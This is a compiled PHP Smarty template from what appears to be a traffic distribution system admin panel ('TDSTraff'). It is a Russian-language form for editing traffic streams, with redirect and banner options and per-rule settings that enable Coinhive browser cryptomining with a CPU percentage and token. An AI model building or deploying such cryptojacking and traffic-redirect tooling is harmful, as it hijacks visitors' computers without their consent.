<?php /* Smarty version Smarty-3.1.21-dev, created on 2018-04-17 20:55:42
         compiled from "/var/www/tds/core/view/tpl/user/trackers/actionstracker.tpl" */ ?>
<?php /*%%SmartyHeaderCode:21293013245a423f0f48a0f4-56203039%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_valid = $_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'f6d7f846a3ff8b93c866572c0b27e45ef1e51a7b' => 
    array (
      0 => '/var/www/tds/core/view/tpl/user/trackers/actionstracker.tpl',
      1 => 1523748268,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '21293013245a423f0f48a0f4-56203039',
  'function' => 
  array (
  ),
  'version' => 'Smarty-3.1.21-dev',
  'unifunc' => 'content_5a423f0f5ae229_26381772',
  'variables' => 
  array (
    'request' => 0,
    'item' => 0,
...
<?php if ($_valid && !is_callable('content_5a423f0f5ae229_26381772')) {function content_5a423f0f5ae229_26381772($_smarty_tpl) {?><?php if (!is_callable('smarty_modifier_replace')) include '/var/www/tds/core/smarty/plugins/modifier.replace.php';
?><?php echo '<script'; ?>
...
'>
<title>TDSTraff - <?php if ($_smarty_tpl->tpl_vars['request']->value['action']=='edit') {?> Просмотр (редактирование) потока <?php } else { ?> Добавить новый поток <?php }?></title>
...
' <?php if ($_smarty_tpl->tpl_vars['request']->value['tracker']['domain']==$_smarty_tpl->tpl_vars['item']->value['domain']) {?> selected <?php }?> > <?php echo $_smarty_tpl->tpl_vars['item']->value['domain'];?>
 <?php if ($_smarty_tpl->tpl_vars['item']->value['for_all']=='1') {?> (Общий) <?php }?></option>
		<?php } ?> <?php }?>
		</select> 
...
' id = '' maxlength = '6' type = 'text' name = 'rule[_0][bannersTimer]' onchange = "redirectNumber(this);" /><label> секунд (кроме форматов Banner,Redirect,Frame)</label></div>
				...
				<div>
					...
					<input type="radio" name="tracker[allowCOIN]" value="N" <?php if ($_smarty_tpl->tpl_vars['request']->value['tracker']['allowCOIN']=='N') {?>checked<?php }?>> Нет
					<input type="radio" name="tracker[allowCOIN]" value="A" <?php if ($_smarty_tpl->tpl_vars['request']->value['tracker']['allowCOIN']=='A') {?>checked<?php }?>> Non AdBlock
					<input type="radio" name="tracker[allowCOIN]" value="Y" <?php if ($_smarty_tpl->tpl_vars['request']->value['tracker']['allowCOIN']=='Y') {?>checked<?php }?>> Default
				</div>

				<div>
					<label>CPU Coinhive: </label><input size = '2' value = '<?php echo $_smarty_tpl->tpl_vars['request']->value['tracker']['coinCPU'];?>
' maxlength = '2' type = 'text' name = 'tracker[coinCPU]' " /> %
				</div>
				
				
				<div>
					<label>Token Coinhive: </label><input size = '40' value = '<?php echo $_smarty_tpl->tpl_vars['request']->value['tracker']['coinToken'];?>
' maxlength = '32' type = 'text' name = 'tracker[coinToken]' " />
			  ...
			  <div class = 'filedFilterSelect'>
				...
				<div class = 'clear'></div>
			  	<div>
					...
					<input type="radio" name="rule[<?php echo $_smarty_tpl->tpl_vars['k']->value;?>
][allowCOIN]" value="N" <?php if ($_smarty_tpl->tpl_vars['rule']->value['allowCOIN']=='N') {?>checked<?php }?>> Нет
					<input type="radio" name="rule[<?php echo $_smarty_tpl->tpl_vars['k']->value;?>
][allowCOIN]" value="A" <?php if ($_smarty_tpl->tpl_vars['rule']->value['allowCOIN']=='A') {?>checked<?php }?>> Non AdBlock
					<input type="radio" name="rule[<?php echo $_smarty_tpl->tpl_vars['k']->value;?>
][allowCOIN]" value="Y" <?php if ($_smarty_tpl->tpl_vars['rule']->value['allowCOIN']=='Y') {?>checked<?php }?>> Default
				</div>

				<div>
					<label>CPU Coinhive: </label><input size = '2' value = '<?php echo $_smarty_tpl->tpl_vars['rule']->value['coinCPU'];?>
' maxlength = '2' type = 'text' name = 'rule[<?php echo $_smarty_tpl->tpl_vars['k']->value;?>
][coinCPU]' /> %
				</div>
				
				
				<div>
					<label>Token Coinhive: </label><input size = '40' value = '<?php echo $_smarty_tpl->tpl_vars['rule']->value['coinToken'];?>
' maxlength = '32' type = 'text' name = 'rule[<?php echo $_smarty_tpl->tpl_vars['k']->value;?>
][coinToken]' />
